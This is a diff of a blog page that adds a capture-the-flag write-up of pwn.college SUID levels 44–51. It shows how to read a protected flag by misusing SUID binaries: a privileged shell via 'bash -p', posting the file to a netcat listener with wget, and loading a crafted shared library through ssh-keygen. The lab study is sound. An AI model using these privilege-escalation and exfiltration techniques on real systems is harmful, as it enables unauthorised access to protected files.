@@ -325,7 +325,7 @@
 
 
                 <time class="article-time--reading">
-                    5 minute read
+                    7 minute read
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -336,7 +336,7 @@
 
 
                 <time class="article-words">
-                    2015 字
+                    3095 字
                 </time>
             </div>
         
@@ -926,6 +926,376 @@ Run COMMAND with an adjusted niceness, which affects process scheduling.With no 
 </span></span><span class="line"><span class="cl">ruby hack.rb <span class="c1">#can read the flag</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>level 44: <strong>bash</strong>&mdash;&gt;(<strong>Bourne Again Shell</strong>) execute the orders read from standard input or files</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash -p <span class="c1">#get the shell</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>just straight up weren&rsquo;t designed to let you read files</strong></p>
+<p>level 45: <strong>date</strong>&mdash;&gt; Display the current time in the given FORMAT, or set the system date.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hacker@babysuid_level45:/$ date -f flag
+</span></span><span class="line"><span class="cl">date: invalid date <span class="s1">&#39;pwn.college{the flag}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-f, --file=DATEFILE        like --date; once for each line of DATEFILE</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level 46: <strong>dmesg</strong>&ndash;&gt;(display message): Display boot information / Display or control the kernel ring buffer. The kernel stores boot information in the <strong>ring buffer</strong>. If you do not  have time to view the information on boot, you can use <code>dmesg</code> to do so.  The boot information is also saved in the <code>/var/log</code> directory in a file  called <strong>dmesg</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dmesg -rF flag <span class="c1">#can read the flag</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-r: --raw	print the raw message buffer</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-F: --file &lt;file&gt;	use the file instead of the kernel log buffer</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level 47: <strong>wc</strong>(Count words)&mdash;&gt;Print newline, word, and byte counts for each FILE, and a total line if
+more than one FILE is specified.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">wc --files0-from ./flag
+</span></span><span class="line"><span class="cl"><span class="c1">#result:wc: &#39;pwn.college{the flag}&#39;$&#39;\n&#39;: No such file or directory</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#--files0-from=F    read input from the files specified by</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#                   NUL-terminated names in file F;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level 48: <strong>gcc</strong>&mdash;&gt;compiler for c &amp; c++</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hacker@babysuid_level48:/$ gcc -x c -E flag
+</span></span><span class="line"><span class="cl"><span class="c1"># 1 &#34;flag&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1 &#34;&lt;built-in&gt;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1 &#34;&lt;command-line&gt;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 31 &#34;&lt;command-line&gt;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1 &#34;/usr/include/stdc-predef.h&#34; 1 3 4</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 32 &#34;&lt;command-line&gt;&#34; 2</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1 &#34;flag&#34;</span>
+</span></span><span class="line"><span class="cl">pwn.college<span class="o">{</span>the flag<span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#-x: -x &lt;language&gt;	Specify the language of the following input files.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#                   Permissible languages include: c c++ assembler none</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#                   &#39;none&#39; means revert to the default behavior of</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#                   guessing the language based on the file&#39;s extension.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#-E: Preprocess only; do not compile, assemble or link.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level 49: <strong>as</strong>&mdash;&gt;a kind of Compiler set</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">as @flag
+</span></span><span class="line"><span class="cl"><span class="c1">#result:Assembler messages:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#		Error: can&#39;t open pwn.college{the flag} for reading: No such file or directory</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#@FILE	read options from FILE</span>
+</span></span><span class="line"><span class="cl">as -f flag
+</span></span><span class="line"><span class="cl"><span class="c1">#result:flag: Assembler messages:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#		flag:1: Error: no such instruction: `pwn.college{flag}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -f: skip whitespace and comment preprocessing</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level 50: <strong>wget</strong>&mdash;&gt; a tool for downloading files from the specified URL</p>
+<blockquote>
+<p><strong>Usage: wget [OPTION]&hellip; [URL]&hellip;</strong></p>
+<p>The file to be read is treated as a list of URLs, one per line, which are actually fetched by <code>wget</code>. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hacker@babysuid_level50:/$ wget -i flag
+</span></span><span class="line"><span class="cl">--2022-11-10 02:19:47--  http://pwn.college%7flag%7D/
+</span></span><span class="line"><span class="cl">Resolving pwn.college<span class="o">{</span>flag<span class="o">}</span> <span class="o">(</span>pwn.college<span class="o">{</span>flag<span class="o">})</span>... failed: Name or service not known.
+</span></span><span class="line"><span class="cl">wget: unable to resolve host address <span class="s1">&#39;pwn.college{flag}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-i,--input-file=FILE		download URLs found in local or external FILE</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#use the -i,error output will forcely convert the content all to lowercase</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lnvp <span class="m">8088</span> <span class="c1">#listeng on the port 8088</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-l : Listen mode, for inbound connects</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#*-n: Suppress name/port resolutions. If there&#39;s no -n, error:&#39;nc: getnameinfo: Temporary failure in name resolution&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-v : Shows the execution of instructions</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-p : port---Specify local port for remote connects</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">wget --post-file<span class="o">=</span>/flag http://127.0.0.1:8088 <span class="c1">#another terminal get the flag</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#--post-file=FILE	use the POST method; send contents of FILE</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>allowing users to load their own code as plugins into the program is dangerous</strong></p>
+<p>level 51: <strong>ssh-keygen</strong>&mdash;&gt;Used to generate an SSH public key for the public and private key file, this level is difficult so I can&rsquo;t understand well about it. Maybe I&rsquo;ll explore that later.</p>
+<blockquote>
+<p>It loads shared libraries that may be used to run code in the binary execution context.</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ssh-keygen -D ./lib.so <span class="c1">#but there&#39;s no ./lib.so</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-D pkcs11:Download the public keys provided by the PKCS#11 shared library pkcs11</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>the replay of the video:</strong><a class="link" href="https://www.youtube.com/watch?v=14mIjpOXnrM&amp;t=2878s"  target="_blank" rel="noopener"
+    >TheAnswerVideo</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hacker@babysuid_level51:/$ ssh-keygen -D flag
+</span></span><span class="line"><span class="cl"><span class="c1">#dlopen flag failed: flag: cannot open shared object file: No such file or directory</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#cannot read public key from pkcs11</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//hack.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;hello world&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">my_function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;I am here&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//gcc -shared hack.c  ---&gt;   a.out
+</span></span></span><span class="line"><span class="cl"><span class="c1">//./a.out -----&gt;Segmentation fault (core dumped)
+</span></span></span><span class="line"><span class="cl"><span class="c1">//file a.out
+</span></span></span><span class="line"><span class="cl"><span class="c1">//a.out: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=d2dbe213d9619e8226e1a4c108b9cde1ed002664, not stripped
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gcc hack.c
+</span></span><span class="line"><span class="cl"><span class="c1">#./a.out ------&gt;hello world</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#file a.out</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#a.out: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cbd6236d2d832f1b2673a51f31ad4b2b166f5878, for GNU/Linux 3.2.0, not stripped</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hacker@babysuid_level51:~$ ldd /bin/false
+</span></span><span class="line"><span class="cl">        linux-vdso.so.1 <span class="o">(</span>0x00007ffd32359000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f9e7fe94000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        /lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f9e800a7000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">hacker@babysuid_level51:~$ file /lib/x86_64-linux-gnu/libc-2.31.so
+</span></span><span class="line"><span class="cl">/lib/x86_64-linux-gnu/libc-2.31.so: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>GNU/Linux<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="o">[</span>sha1<span class="o">]=</span>1878e6b475720c7c51969e69ab2d276fae6d1dee, <span class="k">for</span> GNU/Linux 3.2.0, stripped
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hacker@babysuid_level51:~$ ssh-keygen -D a.out
+</span></span><span class="line"><span class="cl">dlopen a.out failed: a.out: cannot open shared object file: No such file or directory
+</span></span><span class="line"><span class="cl">cannot <span class="nb">read</span> public key from pkcs11
+</span></span><span class="line"><span class="cl">hacker@babysuid_level51:~$ ssh-keygen -D ./a.out
+</span></span><span class="line"><span class="cl">dlsym<span class="o">(</span>C_GetFunctionList<span class="o">)</span> failed: ./a.out: undefined symbol: C_GetFunctionList
+</span></span><span class="line"><span class="cl">cannot <span class="nb">read</span> public key from pkcs11
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//hack.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;hello world&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">C_GetFunctionList</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;I am here&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hacker@babysuid_level51:~$ ssh-keygen -D ./a.out
+</span></span><span class="line"><span class="cl">I am here
+</span></span><span class="line"><span class="cl">C_GetFunctionList <span class="k">for</span> provider ./a.out failed: <span class="m">10</span>
+</span></span><span class="line"><span class="cl">cannot <span class="nb">read</span> public key from pkcs11
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//hack.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;hello world&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// or static void inject() __attribute__((constructor));
+</span></span></span><span class="line"><span class="cl"><span class="c1">//void inject(){}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">C_GetFunctionList</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sendfile</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">open</span><span class="p">(</span><span class="s">&#34;../../flag&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span><span class="mi">0</span><span class="p">,</span><span class="mi">4096</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gcc -shared hack.c 
+</span></span><span class="line"><span class="cl">ssh-keygen -D ./a.out <span class="c1">#get the flag</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Dynamic Link Library</strong>(.dll &amp; .so)</p>
+<p>The library file is made into a compiled program, giving them an interface for exchanging data, and when writing a program, once a function of a library file is used, the system calls the library file into memory. When the required functionality is complete, the DLL stops running and the entire call process ends.</p>
+<p><strong>Static library</strong>(.a &amp; .lib)</p>
+<p>for convenience, put the general-purpose program together, this is the library. Computer has to include all the programs in the link library, making the program big.</p>
+<p><strong>used to find the suid file</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">find / -type f -perm -04000 -ls 2&gt;/dev/null
+</span></span><span class="line"><span class="cl"><span class="c1">#-type f: file type</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-perm: permission 4000:root</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#2&gt;/dev/null:output the error to the &#34;blackhole/bin&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>gcc can create shared libraries with the <code>-shared</code> parameter. dll can&rsquo;t bu run alone, but rather a program that must be called by someone else. the difference between it and ordinary binaries is that it can be seen with the <code>file</code> command.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gcc x.c -shared -o x.so
+</span></span></code></pre></td></tr></table>
+</div>
 </div>
 </section>
 
@@ -1002,7 +1372,7 @@ Run COMMAND with an adjusted niceness, which affects process scheduling.With no 
         
             
         
-        共 2.35k 字 · 共 3篇文章
+        共 3.43k 字 · 共 3篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
             <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
